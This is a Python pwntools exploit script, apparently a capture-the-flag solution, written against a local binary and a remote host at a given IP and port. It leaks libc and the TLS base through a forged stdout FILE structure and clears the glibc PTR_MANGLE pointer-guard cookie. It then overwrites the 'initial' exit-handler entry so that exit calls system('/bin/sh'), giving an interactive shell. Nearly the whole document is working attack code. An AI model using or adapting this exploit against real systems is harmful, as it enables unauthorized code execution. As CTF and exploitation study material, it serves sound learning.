#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
#context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=-1', '--geometry=128x98+2900+0', '-e']
context.terminal = ['alacritty', '--title=GDB-Pwn','-o', 'window.dimensions.lines=76', '-o', 'window.dimensions.columns=150', '-o', 'window.position.x=2800', '-o', 'window.position.y=0','-o','font.size=8.0','-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./prog')
libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "206.189.113.236", "30674"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef.bata24.git/gef.py
    gef config context.show_opcodes_size 9
    si
    directory /usr/src/glibc/glibc-2.38
    b main
    c
    b *__run_exit_handlers
    c
     ''', api=True)
  else:
    p = process(exe.path)


def write(addr, data):
  sla('choice> ', '1')
  sla('> ', str(addr))
  sla('size> ', str(len(data))+'\x00')
  sa('data> ', data)

# stdout read primitive
def readmem(stdout_addr, addr, size, returned=0):
  temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr + size)*3 + p64(addr + size +1)
  write(stdout_addr, temp)
  if returned:
    return p.read(size)

stdout = int(rcu('leak: ','\n'),16)
libc.address = stdout-libc.sym['_IO_2_1_stdout_']
logbase()

# leak tls base
tls = u64(readmem(stdout,  libc.address+0x1ff898, 8, 1)) - 0x3c000
logleak('tls base', tls)
cookie = tls + 0x770	# PTR_MANGLE cookie
logleak('tls PTR_MANGLE cookie', cookie)
# clear PTR_MANGLE cookie
write(cookie, p64(0))

# overwrite initial cxa func with system & its arg with '/bin/sh' string address
write(libc.sym['initial']+24, p64(libc.sym['system']<<17)+p64(next(libc.search(b'/bin/sh'))) )
# exit to shell
sla('choice> ', '2')

p.interactive()

